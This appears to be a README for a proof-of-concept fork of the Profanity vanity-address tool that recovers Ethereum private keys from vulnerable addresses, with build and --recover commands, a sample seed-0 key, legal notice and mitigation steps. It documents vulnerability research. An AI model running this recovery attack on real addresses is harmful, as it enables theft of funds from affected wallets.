# Swear Jar 

A fork of profanity that implements a proof of concept for recoverying private keys generated by vanity addresses. 

⚠️ **CRITICAL SECURITY WARNING - DO NOT USE THIS TOOL TO GENERATE ETHEREUM ADDRESSES OR PRIVATE KEYS.** ⚠️

## Proof of Concept: Private Key Recovery Implementation

**The profanity codebase has been modified to demonstrate the private key recovery attack** against addresses generated by the vulnerable Profanity tool. This implementation serves as a proof of concept showing how the disclosed vulnerability can be exploited.

A few simple command-line parameters have been added to test the functionality quickly with low seed values for demonstrative purposes:

## Quick Test: Generate and Recover a Key from Seed 0

This demonstrates the vulnerability using a known seed value for testing purposes.

### Step 0: Build the tool

```bash
# Compile the modified code
make clean && make
```

### Step 1: Generate a vanity address using Seed 0

```bash
# Generate a vanity address that has leading 0's in it (will use seed 0)
./profanity.x64 --leading f --test-seed 0
```

You should see something like this as output:

```

  Always verify that a private key generated by this program corresponds to the
  public key printed by importing it to a wallet of your choice. This program
  like any software might contain bugs and it does by design cut corners to
  improve overall performance.

# Record the generated address and private key from the output

In our case, lets use the key that took 6 seconds to generate using seed 0:

```
Private: 0x98f56903cf14ea8a0a213217f032e8b9fdfd3a7c3e40f98b28e837c5cb41de52
Address: 0xfffffffff6097c2abd9d4e6175ad6f6d4d824458
```

### Step 4: Test Recovery Attack

```bash
# Attempt to recover the private key from the address
./profanity.x64 --recover 0xYOUR_TEST_ADDRESS_HERE
./profanity.x64 --recover 0xfffffffff6097c2abd9d4e6175ad6f6d4d824458
```

The output will look something like this:

```bash
# 6 seconds of hash speed generation will show on screen ...

⚠️  CRITICAL SECURITY NOTE:
This demonstrates the Profanity vulnerability. Any address
generated with this tool can be cracked using this method.

## Ethical and Legal Notice

### This Implementation is For:
✅ Security research and education  
✅ Demonstrating the vulnerability for academic purposes  
✅ Testing if addresses are vulnerable  
✅ Understanding cryptographic weaknesses  

### This Implementation is NOT For:
❌ Stealing funds from vulnerable wallets  
❌ Unauthorized access to cryptocurrency  
❌ Any illegal activity  

**Warning:** Unauthorized access to cryptocurrency wallets is a criminal offense in most jurisdictions. This tool is provided strictly for defensive security research and education.

---

## Mitigation

If you ever used Profanity to generate Ethereum addresses:

1. **Immediately transfer all assets** to a new wallet generated with proper entropy sources
2. **Change smart contract ownership** if Profanity generated any deployer addresses
3. **Monitor for suspicious activity** on affected addresses
4. **Never use Profanity or similar tools** for production key generation

Use secure alternatives:
- Hardware wallets (Ledger, Trezor)
- `openssl rand -hex 32`
- Established wallet software with proper CSPRNG implementation

---

**Current Status:** Tens to hundreds of millions of dollars have been stolen from Profanity-generated wallets since the vulnerability's disclosure. Any address generated with Profanity should be considered completely compromised.
